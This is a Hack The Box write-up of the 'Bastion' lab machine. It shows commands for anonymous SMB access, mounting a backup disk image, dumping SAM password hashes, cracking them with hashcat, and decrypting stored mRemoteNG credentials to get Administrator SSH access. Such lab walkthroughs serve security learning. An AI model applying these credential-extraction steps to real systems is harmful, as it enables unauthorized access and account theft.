---
title: HTB Writeup - BASTION
published: true
---

Bastion was an interesting box - all the information needed to compromise the system was pretty much 'right there', with very little real exploitation required other than looking hard and taking what was given. Starting as usual
with an `nmap` scan:

<pre>
<kw>root@kali:~</kw># nmap -sV 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org )
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 17:33 (0:00:18 remaining)
Nmap scan report for 10.10.10.134
Host is up (0.051s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info:  
OSs: Windows, Windows Server 2008 R2 - 2012;  
CPE: cpe:/o:microsoft:windows
</pre>

Based on the OS and SMB version running, I quickly tried a couple of metasploit modules for a quick fail, but got nothing. However, we can see the SMB shares available with `smbclient`, as anonymous access (with empty password) is allowed:

<pre>
<kw>root@kali:~</kw># smbclient -L //10.10.10.134
Enter WORKGROUP\root's password:  

       Sharename       Type      Comment
       ---------       ----      -------
       ADMIN$          Disk      Remote Admin
       Backups         Disk       
       C$              Disk      Default share
       IPC$            IPC       Remote IPC
</pre>

ADMIN, C, and IPC all require authentication. Let's check out Backups:

<pre>
<kw>root@kali:~</kw># smbclient //10.10.10.134/Backups
Enter WORKGROUP\root's password:  
Try "help" to get a list of possible commands.
<kw>smb: \></kw> ls
 .                                   D        0  Tue Apr 16 06:02:11 2019
 ..                                  D        0  Tue Apr 16 06:02:11 2019
 note.txt                           AR      116  Tue Apr 16 06:10:09 2019
 SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
 WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

               7735807 blocks of size 4096. 2777562 blocks available
<kw>smb: \></kw> get note.txt
getting file \note.txt of size 116 as note.txt (0.6 KiloBytes/sec)  
<kw>smb: \></kw> exit
<kw>root@kali:~</kw># cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN  
to the subsidiary office is too slow.
</pre>

Before we go any further, let's mount this share on our system, so we don't have to use `smbclient` for everything.

<pre>
<kw>root@kali:~</kw># mkdir /mnt/bastion
<kw>root@kali:~</kw># mount -t cifs //10.10.10.134/Backups /mnt/bastion
Password for root@//10.10.10.134/Backups:   
<kw>root@kali:~</kw># cd /mnt/bastion/
<kw>root@kali:/mnt/bastion</kw># ls -l
total 1
-r-xr-xr-x 1 root root 116 Apr 16 06:10 note.txt
-rwxr-xr-x 1 root root   0 Feb 22  2019 SDT65CB.tmp
drwxr-xr-x 2 root root   0 Feb 22  2019 WindowsImageBackup
</pre>

Poking around leads us to this folder:

<pre>
<kw>root@kali:/mnt/bastion/WindowsImageBackup/L4mpje-PC</kw># ls -l
total 4
drwxr-xr-x 2 root root  0 Feb 22  2019 'Backup 2019-02-22 124351'
drwxr-xr-x 2 root root  0 Feb 22  2019  Catalog
-rwxr-xr-x 1 root root 16 Feb 22  2019  MediaId
drwxr-xr-x 2 root root  0 Feb 22  2019  SPPMetadataCache
</pre>

And within the backup folder, we find these two .vhd files in particular.

<pre>
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
</pre>  

### [](#header-3)Compromising a User

These are virtual hard disks, and contain an entire filesystem. To view that filesystem, we need to mount the vhd file as well. Let's mount the second one.

<pre>
<kw>root@kali:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351</kw>#
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
<kw>root@kali:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351</kw>#
cd /mnt/vhd
<kw>root@kali:/mnt/vhd</kw># ls -la
total 2096729
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings'
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
</pre>

We now have full access to the filesystem. There are no flags present here, but we can extract passwords using the SYSTEM and SAM hives, which could provide access given that this vhd is a backup of the actual Bastion box.

<pre>
<kw>root@kali:/mnt/vhd</kw># cp Windows/System32/config/{SYSTEM,SAM} ~/bastion/
<kw>root@kali:/mnt/vhd</kw># cd ~/bastion/
<kw>root@kali:~/bastion</kw># pwdump SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:<int>26112010952d963c8dc4217daec986d9</int>::
</pre>

The hashes beginning with 'aad3b' and with '31d6c' represent the LM and NT hashes, respectively, of the empty string.
This means the actual Administrator password is not stored here - but the NT hash for user 'L4mpje' is. We'll crack
it with `hashcat`.

<pre>
<kw>root@kali:~/bastion</kw># pwdump SYSTEM SAM > hashes.txt
<kw>root@kali:~/bastion</kw># hashcat -m 1000 hashes.txt
<kw>root@kali:~/bastion</kw># hashcat -m 1000 hashes.txt --show
31d6cfe0d16ae931b73c59d7e0c089c0:
26112010952d963c8dc4217daec986d9:bureaulampje
</pre>

We have the user password! Recall that in our initial `nmap` scan we found an open SSH port...

<pre>
<kw>root@kali:~/bastion</kw># ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:  

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

<kw>l4mpje@BASTION C:\Users\L4mpje></kw> more Desktop\user.txt
</pre>

### [](#header-3)Privilege Escalation

With the user flag taken, I began looking for avenues of privilege escalation, and before long found some passwords left in xml files:

<pre>
<kw>l4mpje@BASTION C:\Users\L4mpje></kw> findstr /si password *.xml
AppData\Roaming\mRemoteNG\confCons.xml: &lt;Node Name="DC" Type="Connection" Descr=""
Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee"  
<int>Username="Administrator"</int> Domain="" <int>Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5d
maPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</int> Hostname="127.0.0.1"
...
RDGatewayUsageMethod="false" InheritRDGatewayHostname="false"  
InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false"
InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" /&gt;
AppData\Roaming\mRemoteNG\confCons.xml: &lt;Node Name="L4mpje-PC" Type="Connection"  
Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
<int>Username="L4mpje"</int> Domain="" <int>Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXy
bLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"</int> Hostname="192.168.1.75" Protocol="RDP"
...
InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false"  
InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false"  
InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" /&gt;
</pre>

mRemoteNG is  a remote connections manager, and is well-known to store passwords very insecurely. The process is, in short, an AES encryption using a publicly known static key, followed by base64 encoding. Really, it's only intended to stop a casual user from reading plaintext passwords - the file should have been deleted.

It would be simple enough to decrypt the password, but to make things even faster we can use [this script](https://gi
thub.com/haseebT/mRemoteNG-Decrypt/) written by haseebT. Let's see what we get by running it on the Administrator password.

<pre>
<kw>root@kali:~/bastion</kw># ./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0N
w5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
</pre>

Finally, we login with that password over ssh and grab the root flag.

<pre>
<kw>root@kali:~/bastion</kw># ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password:  

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

<kw>administrator@BASTION C:\Users\Administrator></kw> more Desktop\root.txt
</pre>

And we're all done. Thanks for reading!

- <kw>j4ckdaw</kw>
